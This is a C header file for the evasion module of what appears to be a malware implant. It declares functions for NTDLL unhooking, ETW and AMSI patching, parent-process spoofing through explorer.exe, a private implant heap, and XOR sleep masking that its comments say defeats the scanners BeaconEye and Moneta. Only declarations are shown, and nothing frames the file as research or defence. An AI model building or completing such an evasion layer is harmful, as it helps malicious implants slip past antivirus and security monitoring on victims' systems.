#ifndef _EVASION_H
#define _EVASION_H

#include "common.h"

// =============================================
// NTDLL Unhooking - Replace hooked .text section
// =============================================
BOOL UnhookNtdll(VOID);

// =============================================
// ETW Bypass - Patch ETW event writing functions
// =============================================
BOOL PatchEtw(VOID);

// =============================================
// AMSI Bypass - Patch AMSI scanning functions
// =============================================
BOOL PatchAmsi(VOID);

// =============================================
// Run all evasion techniques
// =============================================
BOOL RunAllEvasion(VOID);

// =============================================
// PPID Spoofing - Open explorer.exe for use as spoofed parent process
// Caller must CloseHandle() the returned handle when done
// =============================================
HANDLE GetSpoofParentHandle(VOID);

// =============================================
// Private Heap — isolates implant allocations from CRT heap
// Call ImplantHeapInit() once at startup before any ImplantAlloc calls
// =============================================
BOOL  ImplantHeapInit(VOID);
PVOID ImplantAlloc(SIZE_T size);
VOID  ImplantFree(PVOID ptr);

// =============================================
// Sleep Masking - XOR private heap before sleep, restore after
// Defeats in-memory scanners (BeaconEye, Moneta) during idle periods
// =============================================
VOID MaskedSleep(DWORD dwMs);

#endif // _EVASION_H
